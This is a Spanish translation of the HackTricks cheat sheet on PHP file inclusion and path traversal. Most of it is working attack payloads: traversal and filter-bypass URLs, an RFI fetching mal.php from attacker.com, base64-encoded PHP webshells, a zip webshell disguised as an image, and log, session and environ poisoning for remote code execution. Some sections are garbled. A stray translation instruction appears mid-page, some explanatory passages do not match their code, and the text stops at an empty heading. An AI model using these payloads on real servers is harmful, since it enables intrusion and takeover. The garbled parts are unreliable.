# Inclusión de archivos/Travesía de ruta

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof es el hogar de todas las recompensas por errores de criptografía.**

**Obtén recompensas sin demoras**\
Las recompensas de HackenProof se lanzan solo cuando sus clientes depositan el presupuesto de recompensa. Obtendrás la recompensa después de que se verifique el error.

**Obtén experiencia en pentesting web3**\
¡Los protocolos de blockchain y los contratos inteligentes son el nuevo Internet! Domina la seguridad web3 en sus días de crecimiento.

**Conviértete en la leyenda del hacker web3**\
Gana puntos de reputación con cada error verificado y conquista la cima de la clasificación semanal.

[**Regístrate en HackenProof**](https://hackenproof.com/register) y comienza a ganar con tus hacks!

{% embed url="https://hackenproof.com/register" %}

## Inclusión de archivos

**Inclusión de archivos remotos (RFI):** El archivo se carga desde un servidor remoto (lo mejor: puedes escribir el código y el servidor lo ejecutará). En php esto está **desactivado** de forma predeterminada (**allow\_url\_include**).\
**Inclusión de archivos locales (LFI):** El servidor carga un archivo local.

La vulnerabilidad ocurre cuando el usuario puede controlar de alguna manera el archivo que va a ser cargado por el servidor.

Funciones de PHP vulnerables: require, require\_once, include, include\_once

Una herramienta interesante para explotar esta vulnerabilidad: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Ciegos - Interesantes - Archivos LFI2RCE
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Mezclando varias listas de LFI de \*nix y añadiendo más rutas, he creado esta:**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt" %}

También intenta cambiar `/` por `\`\
También intenta añadir `../../../../../`

Puedes encontrar una lista que utiliza varias técnicas para encontrar el archivo /etc/password (para comprobar si existe la vulnerabilidad) [aquí](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

Mezclando varias listas he creado esta:

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt" %}

También intenta cambiar `/` por `\`\
También intenta eliminar `C:/` y añadir `../../../../../`

Puedes encontrar una lista que utiliza varias técnicas para encontrar el archivo /boot.ini (para comprobar si existe la vulnerabilidad) [aquí](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Consulta la lista de LFI de Linux.

## LFI básico y bypasses

Todos los ejemplos son para Local File Inclusion, pero también se pueden aplicar a Remote File Inclusion (page=[http://myserver.com/phpshellcode.txt\\](http://myserver.com/phpshellcode.txt\)/).
```
http://example.com/index.php?page=../../../etc/passwd
```
### Secuencias de recorrido sin recursión eliminadas

El objetivo de este script es eliminar las secuencias de recorrido sin recursión en un archivo. Esto es útil en el contexto de la inclusión de archivos, donde se pueden utilizar secuencias de recorrido para acceder a archivos fuera del directorio actual.

El script toma como entrada una cadena que representa una secuencia de recorrido y devuelve la secuencia sin las partes que no son recursivas. Esto se logra eliminando las partes de la secuencia que están entre los caracteres "../" y "/".

El script se puede utilizar para mitigar el riesgo de inclusión de archivos no deseados al eliminar las partes de la secuencia que podrían permitir el acceso a archivos fuera del directorio actual. Sin embargo, es importante tener en cuenta que esto no es una solución completa y que se deben implementar otras medidas de seguridad para protegerse contra la inclusión de archivos no deseados.
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

Bypass para agregar más caracteres al final de la cadena proporcionada (bypass de: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Esto está **solucionado desde PHP 5.4**

### **Codificación**

Podrías usar codificaciones no estándar como la codificación de doble URL (y otras):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### Desde la carpeta existente

Tal vez el back-end está verificando la ruta de la carpeta:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Identificación de carpetas en un servidor

Dependiendo del código aplicativo / caracteres permitidos, es posible explorar de forma recursiva el sistema de archivos descubriendo carpetas y no solo archivos. Para hacerlo:

* identifica la "profundidad" de tu directorio actual al recuperar exitosamente `/etc/passwd` (si estás en Linux):
```
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
* Intenta adivinar el nombre de una carpeta en el directorio actual agregando el nombre de la carpeta (aquí, `private`), y luego regresando a `/etc/passwd`:
```
http://example.com/index.php?page=private/../../../../etc/passwd # we went deeper down one level, so we have to go 3+1=4 levels up to go back to /etc/passwd
```
* si la aplicación es vulnerable, puede haber dos resultados diferentes para la solicitud:
* si obtienes un error / sin salida, la carpeta `private` no existe en esta ubicación
* si obtienes el contenido de `/etc/passwd`, has validado que hay una carpeta `private` en tu directorio actual
* las carpetas que descubras utilizando estas técnicas pueden ser probadas para archivos (usando un método clásico de LFI) o para subdirectorios utilizando la misma técnica de forma recursiva.

Es posible adaptar esta técnica para encontrar directorios en cualquier ubicación del sistema de archivos. Por ejemplo, si, bajo la misma hipótesis (directorio actual a una profundidad de 3 en el sistema de archivos), quieres verificar si `/var/www/` contiene un directorio `private`, utiliza la siguiente carga útil:
```
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
La siguiente secuencia de comandos permite generar payloads utilizando `sed` (1) como entrada para herramientas de fuzzing de URL como `ffuf` (2):
```
$ sed 's_^_../../../var/www/_g' /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt | sed 's_$_/../../../etc/passwd_g' > payloads.txt
$ ffuf -u http://example.com/index.php?page=FUZZ -w payloads.txt -mr "root"
```
Por supuesto, adapta los payloads a tus necesidades en términos de profundidad / ubicación / lista de directorios de entrada.

### **Truncamiento de ruta**

Bypass de la adición de más caracteres al final de la cadena proporcionada (bypass de: $\_GET\['param']."php")
```
In PHP: /etc/passwd = /etc//passwd = /etc/./passwd = /etc/passwd/ = /etc/passwd/.
Check if last 6 chars are passwd --> passwd/
Check if last 4 chars are ".php" --> shellcode.php/.
```

```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd..\.\.\.\.\.\.\.\.\.\.\[ADD MORE]\.\.
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.

#With the next options, by trial and error, you have to discover how many "../" are needed to delete the appended string but not "/etc/passwd" (near 2027)

http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
Siempre intenta **comenzar** la ruta **con un directorio falso** (a/).

**Esta vulnerabilidad fue corregida en PHP 5.3.**

### **Trucos para evadir filtros**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Inclusión Remota de Archivos

En PHP, esto está desactivado de forma predeterminada porque **`allow_url_include`** está configurado en **Off**. Debe estar **On** para que funcione, y en ese caso podrías incluir un archivo PHP desde tu servidor y obtener RCE (Ejecución Remota de Código):
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Si por alguna razón **`allow_url_include`** está **activado**, pero PHP está **filtrando** el acceso a páginas web externas, [según este artículo](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), podrías utilizar, por ejemplo, el protocolo de datos con base64 para decodificar un código PHP en base64 y obtener RCE:

{% code overflow="wrap" %}
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
{% endcode %}

{% hint style="info" %}
En el código anterior, se agregó el `+.txt` final porque el atacante necesitaba una cadena que terminara en `.txt`, de modo que la cadena termine con eso y después de la decodificación b64, esa parte devolverá solo basura y se incluirá (y por lo tanto, se ejecutará) el código PHP real.
{% endhint %}

Otro ejemplo **sin usar el protocolo `php://`** sería:

{% code overflow="wrap" %}
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
{% endcode %}

## Elemento raíz de Python

En Python, en un código como este:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Si el usuario pasa una **ruta absoluta** a **`file_name`**, la **ruta anterior simplemente se elimina**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
Es el comportamiento previsto según [la documentación](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> Si un componente es una ruta absoluta, todos los componentes anteriores se descartan y la unión continúa desde el componente de ruta absoluta.

## Listado de directorios en Java

Parece que si tienes una Travesía de Ruta en Java y **solicitas un directorio** en lugar de un archivo, se devuelve un **listado del directorio**. Esto no ocurre en otros lenguajes (que yo sepa).

## Los 25 principales parámetros

Aquí está la lista de los 25 principales parámetros que podrían ser vulnerables a las vulnerabilidades de inclusión de archivos locales (LFI) (de [enlace](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI utilizando envoltorios y protocolos PHP

### php://filter

Los filtros de PHP permiten realizar operaciones básicas de modificación en los datos antes de ser leídos o escritos. Hay 5 categorías de filtros:

* [Filtros de cadena](https://www.php.net/manual/en/filters.string.php):
* `string.rot13`
* `string.toupper`
* `string.tolower`
* `string.strip_tags`: Elimina las etiquetas de los datos (todo lo que está entre los caracteres "<" y ">")
* Ten en cuenta que este filtro ha desaparecido de las versiones modernas de PHP
* [Filtros de conversión](https://www.php.net/manual/en/filters.convert.php)
* `convert.base64-encode`
* `convert.base64-decode`
* `convert.quoted-printable-encode`
* `convert.quoted-printable-decode`
* `convert.iconv.*`: Transforma a una codificación diferente (`convert.iconv.<input_enc>.<output_enc>`). Para obtener la **lista de todas las codificaciones** admitidas, ejecuta en la consola: `iconv -l`

{% hint style="warning" %}
Abusando del filtro de conversión `convert.iconv.*`, puedes **generar texto arbitrario**, lo cual podría ser útil para escribir texto arbitrario o hacer que una función como include procese texto arbitrario. Para obtener más información, consulta [**LFI2RCE a través de los filtros de PHP**](lfi2rce-via-php-filters.md).
{% endhint %}

* [Filtros de compresión](https://www.php.net/manual/en/filters.compression.php)
* `zlib.deflate`: Comprime el contenido (útil si se exfiltra mucha información)
* `zlib.inflate`: Descomprime los datos
* [Filtros de encriptación](https://www.php.net/manual/en/filters.encryption.php)
* `mcrypt.*`: Obsoleto
* `mdecrypt.*`: Obsoleto
* Otros filtros
* Ejecutando en PHP `var_dump(stream_get_filters());`, puedes encontrar un par de filtros **inesperados**:
* `consumed`
* `dechunk`: invierte la codificación chunked de HTTP
* `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
{% hint style="warning" %}
La parte "php://filter" no distingue entre mayúsculas y minúsculas.
{% endhint %}

### php://fd

Este envoltorio permite acceder a los descriptores de archivo que el proceso tiene abierto. Potencialmente útil para extraer el contenido de archivos abiertos:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
También puedes usar **php://stdin, php://stdout y php://stderr** para acceder a los **descriptores de archivo 0, 1 y 2** respectivamente (no estoy seguro de cómo esto podría ser útil en un ataque)

### zip:// y rar://

Sube un archivo Zip o Rar con un PHPShell adentro y accede a él.\
Para poder abusar del protocolo rar, **necesita estar activado específicamente**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://

La técnica de inclusión de archivos es una vulnerabilidad común en las aplicaciones web que permite a un atacante incluir archivos arbitrarios en una página web. Esto puede conducir a la ejecución remota de código, revelación de información confidencial o incluso a la toma completa del sistema.

La vulnerabilidad de inclusión de archivos ocurre cuando una aplicación web no valida o filtra adecuadamente los datos proporcionados por el usuario antes de incluirlos en una página. Esto permite que un atacante manipule los parámetros de la URL o los datos de formulario para incluir archivos externos.

La técnica de inclusión de archivos se puede explotar de varias formas, como la inclusión de archivos locales, la inclusión de archivos remotos y la inclusión de archivos basada en rutas. Cada una de estas técnicas tiene sus propias características y métodos de explotación.

Es importante que los desarrolladores y los profesionales de la seguridad comprendan cómo funciona esta vulnerabilidad y cómo prevenirla. Algunas medidas de mitigación incluyen la validación y filtrado adecuados de los datos de entrada, el uso de rutas absolutas en lugar de rutas relativas y la limitación de los privilegios de acceso del servidor web.

En resumen, la inclusión de archivos es una vulnerabilidad crítica que puede tener graves consecuencias para la seguridad de una aplicación web. Es fundamental comprender cómo funciona esta técnica y tomar las medidas necesarias para protegerse contra ella.
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Hecho divertido: puedes desencadenar un XSS y evitar el Auditor de Chrome con: `http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+`

Ten en cuenta que este protocolo está restringido por las configuraciones de php **`allow_url_open`** y **`allow_url_include`**

### expect://

Expect debe estar activado. Puedes ejecutar código utilizando esto.
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Especifica tu carga útil en los parámetros POST
```
http://example.com/index.php?page=php://input
POST DATA: <?php system('id'); ?>
```
### phar://

Un archivo `.phar` también se puede utilizar para ejecutar código PHP si el sitio web está utilizando alguna función como `include` para cargar el archivo.

{% code title="create_phar.php" %}
```python
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');

$phar->stopBuffering();
```
{% endcode %}

Y puedes compilar el `phar` ejecutando la siguiente línea:
```bash
php --define phar.readonly=0 create_path.php
```
Se generará un archivo llamado `test.phar` que puedes usar para abusar de la LFI.

Si la LFI solo lee el archivo y no ejecuta el código PHP dentro de él, por ejemplo, utilizando funciones como _**file\_get\_contents(), fopen(), file() o file\_exists(), md5\_file(), filemtime() o filesize()**_**.** Puedes intentar abusar de una **deserialización** que ocurre al **leer** un **archivo** utilizando el protocolo **phar**.\
Para obtener más información, lee el siguiente artículo:

{% content-ref url="phar-deserialization.md" %}
[phar-deserialization.md](phar-deserialization.md)
{% endcontent-ref %}

### Más protocolos

Consulta más [**protocolos para incluir aquí**](https://www.php.net/manual/en/wrappers.php)**:**

* [php://memory y php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — Escribir en memoria o en un archivo temporal (no estoy seguro de cómo esto puede ser útil en un ataque de inclusión de archivos)
* [file://](https://www.php.net/manual/en/wrappers.file.php) — Acceder al sistema de archivos local
* [http://](https://www.php.net/manual/en/wrappers.http.php) — Acceder a URL HTTP(s)
* [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — Acceder a URL FTP(s)
* [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Flujos de compresión
* [glob://](https://www.php.net/manual/en/wrappers.glob.php) — Encontrar nombres de ruta que coincidan con un patrón (no devuelve nada imprimible, por lo que no es realmente útil aquí)
* [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
* [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — Flujos de audio (no útil para leer archivos arbitrarios)

## LFI a través de 'assert' en PHP

Si te encuentras con una LFI difícil que parece filtrar cadenas de travesía como ".." y responde con algo como "Intento de hackeo" o "Buen intento!", es posible que funcione una carga útil de inyección de 'assert'.

Una carga útil como esta:
```
' and die(show_source('/etc/passwd')) or '
```
El siguiente contenido es de un libro de hacking sobre técnicas de hacking. El siguiente contenido es del archivo pentesting-web/file-inclusion/README.md. Traduzca el texto relevante en inglés al español y devuelva la traducción manteniendo exactamente la misma sintaxis de markdown y html. No traduzca cosas como código, nombres de técnicas de hacking, palabras de hacking, nombres de plataformas en la nube/SaaS (como Workspace, aws, gcp...), la palabra 'leak', pentesting y etiquetas de markdown. Tampoco agregue nada aparte de la traducción y la sintaxis de markdown.
```bash
assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");
```
También es posible obtener RCE en una declaración "assert" vulnerable utilizando la función system():
```
' and die(system("whoami")) or '
```
Asegúrate de codificar las cargas útiles en URL antes de enviarlas.

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof es el hogar de todas las recompensas por errores de criptografía.**

**Obtén recompensas sin demoras**\
Las recompensas de HackenProof se lanzan solo cuando sus clientes depositan el presupuesto de recompensa. Obtendrás la recompensa después de que se verifique el error.

**Obtén experiencia en pentesting web3**\
¡Los protocolos de blockchain y los contratos inteligentes son el nuevo Internet! Domina la seguridad web3 en sus días de crecimiento.

**Conviértete en la leyenda del hacker web3**\
Gana puntos de reputación con cada error verificado y conquista la cima de la clasificación semanal.

[**Regístrate en HackenProof**](https://hackenproof.com/register) ¡comienza a ganar con tus hacks!

{% embed url="https://hackenproof.com/register" %}

## Traversal de Ruta Ciega en PHP

{% hint style="warning" %}
Esta técnica es relevante en casos en los que **controlas** la **ruta del archivo** de una **función PHP** que accederá a un archivo pero no verás el contenido del archivo (como una simple llamada a **`file()`**) pero el contenido no se muestra.
{% endhint %}

En [**este increíble post**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) se explica cómo se puede abusar de la traversión de ruta ciega a través del filtro PHP para **filtrar el contenido de un archivo a través de un oráculo de error**.

En resumen, la técnica utiliza la codificación **"UCS-4LE"** para hacer que el contenido de un archivo sea tan **grande** que la **función PHP que abre** el archivo desencadenará un **error**.

Luego, para filtrar el primer carácter se utiliza el filtro **`dechunk`** junto con otros como **base64** o **rot13** y finalmente se utilizan los filtros **convert.iconv.UCS-4.UCS-4LE** y **convert.iconv.UTF16.UTF-16BE** para **colocar otros caracteres al principio y filtrarlos**.

**Funciones que podrían ser vulnerables**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (solo objetivo de solo lectura con esto)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

¡Para obtener detalles técnicos, consulta el post mencionado!

## LFI2RCE

### Inclusión de Archivo Remoto

Explicado anteriormente, [**sigue este enlace**](./#remote-file-inclusion).

### A través del archivo de registro de Apache/Nginx

Si el servidor Apache o Nginx es **vulnerable a LFI** dentro de la función de inclusión, puedes intentar acceder a **`/var/log/apache2/access.log` o `/var/log/nginx/access.log`**, establecer dentro del **agente de usuario** o dentro de un **parámetro GET** una shell de PHP como **`<?php system($_GET['c']); ?>`** e incluir ese archivo.

{% hint style="warning" %}
Ten en cuenta que **si usas comillas dobles** para la shell en lugar de **comillas simples**, las comillas dobles se modificarán por la cadena "_**quote;**_", **PHP lanzará un error** allí y **no se ejecutará nada más**.

Además, asegúrate de **escribir correctamente la carga útil** o PHP mostrará un error cada vez que intente cargar el archivo de registro y no tendrás una segunda oportunidad.
{% endhint %}

Esto también se puede hacer en otros registros, pero **ten cuidado**, el código dentro de los registros podría estar codificado en URL y esto podría destruir la Shell. La cabecera **authorisation "basic"** contiene "usuario:contraseña" en Base64 y se decodifica dentro de los registros. La PHPShell podría insertarse dentro de esta cabecera.\
Otros posibles caminos de registro:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Lista de palabras para fuzzing: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### A través de correo electrónico

**Envía un correo** a una cuenta interna (user@localhost) que contenga tu carga útil PHP como `<?php echo system($_REQUEST["cmd"]); ?>` e intenta incluirlo en el correo del usuario con una ruta como **`/var/mail/<NOMBRE_DE_USUARIO>`** o **`/var/spool/mail/<NOMBRE_DE_USUARIO>`**

### A través de /proc/\*/fd/\*

1. Sube muchas shells (por ejemplo: 100)
2. Incluye [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), donde $PID es el ID del proceso (puede ser forzado por fuerza bruta) y $FD es el descriptor de archivo (también puede ser forzado por fuerza bruta)

### A través de /proc/self/environ

Como un archivo de registro, envía la carga útil en el User-Agent, se reflejará dentro del archivo /proc/self/environ
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### A través de carga

Si puedes cargar un archivo, simplemente inyecta la carga útil de la shell en él (por ejemplo: `<?php system($_GET['c']); ?>`).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Para mantener el archivo legible, es mejor inyectar en los metadatos de las imágenes/doc/pdf.

### A través de la carga de archivos ZIP

Cargue un archivo ZIP que contenga una shell PHP comprimida y acceda a ella:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### A través de sesiones PHP

Verifique si el sitio web utiliza sesiones PHP (PHPSESSID)
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
En PHP, estas sesiones se almacenan en archivos `_/var/lib/php5/sess\_[PHPSESSID]_`
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Establezca la cookie como `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
# Inclusión de archivos PHP de sesión utilizando LFI

La inclusión de archivos locales (LFI, por sus siglas en inglés) es una vulnerabilidad común en aplicaciones web que permite a un atacante incluir archivos arbitrarios en el servidor. Una forma común de explotar esta vulnerabilidad es incluir el archivo de sesión PHP para obtener acceso a la sesión de un usuario.

## Paso 1: Identificar la vulnerabilidad LFI

El primer paso es identificar si la aplicación web es vulnerable a la inclusión de archivos locales. Esto se puede hacer enviando una solicitud HTTP con una ruta de archivo maliciosa en los parámetros de la URL. Por ejemplo:

```
http://example.com/page.php?file=/etc/passwd
```

Si la aplicación muestra el contenido del archivo `/etc/passwd`, es probable que sea vulnerable a la inclusión de archivos locales.

## Paso 2: Incluir el archivo de sesión PHP

Una vez que se ha identificado la vulnerabilidad LFI, el siguiente paso es incluir el archivo de sesión PHP. El archivo de sesión suele tener una extensión como `.php` o `.php5`. La ubicación del archivo de sesión puede variar dependiendo de la configuración del servidor.

Para incluir el archivo de sesión, se puede utilizar una ruta relativa o absoluta en el parámetro de la URL. Por ejemplo:

```
http://example.com/page.php?file=/var/www/html/session.php
```

Esto hará que la aplicación web incluya el archivo de sesión `session.php` ubicado en `/var/www/html/`.

## Paso 3: Explotar la sesión de usuario

Una vez que se ha incluido el archivo de sesión PHP, es posible explotar la sesión de un usuario. Esto se puede hacer mediante la manipulación de las variables de sesión o mediante la ejecución de código malicioso en el contexto de la sesión.

Es importante tener en cuenta que la explotación de la sesión de un usuario es ilegal y solo debe realizarse en un entorno controlado y con el consentimiento del propietario del sistema.

## Conclusiones

La inclusión de archivos locales (LFI) es una vulnerabilidad común en aplicaciones web que puede permitir a un atacante incluir archivos arbitrarios en el servidor. Al incluir el archivo de sesión PHP, un atacante puede obtener acceso a la sesión de un usuario y potencialmente comprometer su cuenta. Es importante que los desarrolladores y administradores de sistemas tomen medidas para mitigar esta vulnerabilidad, como validar y filtrar adecuadamente las entradas del usuario.
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### A través de ssh

Si ssh está activo, verifica qué usuario se está utilizando (/proc/self/status y /etc/passwd) e intenta acceder a **\<HOME>/.ssh/id\_rsa**

### A través de los registros de **vsftpd**

Los registros de este servidor FTP se almacenan en _**/var/log/vsftpd.log.**_ Si tienes una LFI y puedes acceder a un servidor vsftpd expuesto, puedes intentar iniciar sesión configurando la carga útil de PHP en el nombre de usuario y luego acceder a los registros utilizando la LFI.

### A través del filtro base64 de PHP (usando base64)

Como se muestra en [este](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) artículo, el filtro base64 de PHP simplemente ignora los caracteres que no son base64. Puedes usar esto para evadir la verificación de la extensión del archivo: si proporcionas base64 que termina con ".php", simplemente ignorará el "." y agregará "php" al base64. Aquí tienes un ejemplo de carga útil:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### A través de filtros php (no se necesita un archivo)

Este [**informe**](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) explica que se pueden utilizar **filtros php para generar contenido arbitrario** como salida. Lo que básicamente significa que se puede **generar código php arbitrario** para la inclusión **sin necesidad de escribirlo** en un archivo.

{% content-ref url="lfi2rce-via-php-filters.md" %}
[lfi2rce-via-php-filters.md](lfi2rce-via-php-filters.md)
{% endcontent-ref %}

### A través de una falla de segmentación

